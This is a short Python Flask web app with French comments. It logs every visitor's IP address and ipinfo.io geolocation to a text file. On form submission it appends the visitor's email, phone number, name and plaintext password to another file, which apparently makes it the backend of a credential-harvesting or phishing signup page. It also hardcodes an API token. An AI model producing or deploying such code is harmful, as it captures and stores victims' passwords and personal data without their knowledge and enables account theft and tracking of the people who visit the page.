import requests
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

API_KEY = '85deca6bff1f8b'  # Remplace par ta clé API ipinfo.io

def get_ip_info(ip):
    url = f'https://ipinfo.io/{ip}?token={API_KEY}'
    response = requests.get(url)
    return response.json()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr

    ip_info = get_ip_info(visitor_ip)

    # Écriture des informations dans s.txt
    try:
        with open('s.txt', 'a') as f:
            f.write(f"{visitor_ip} - {ip_info}\n")
    except Exception as e:
        print(f"Erreur lors de l'écriture dans s.txt: {e}")

    if request.method == 'POST':
        data = request.get_json()
        email = data.get('email')
        telephone = data.get('telephone')
        nom = data.get('nom')
        password = data.get('password')
        confirm_password = data.get('confirm_password')

        if password != confirm_password:
            return jsonify(success=False, message="Les mots de passe ne correspondent pas!")

        ip_info.update({
            'email': email,
            'telephone': telephone,
            'nom': nom,
            'password': password
        })

        try:
            with open('ips.txt', 'a') as f:
                f.write(f"{visitor_ip} - {ip_info}\n")
        except Exception as e:
            return jsonify(success=False, message=str(e))
        return jsonify(success=True)

    return render_template('index.html')

@app.route('/accueil')
def accueil():
    return render_template('accueil.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
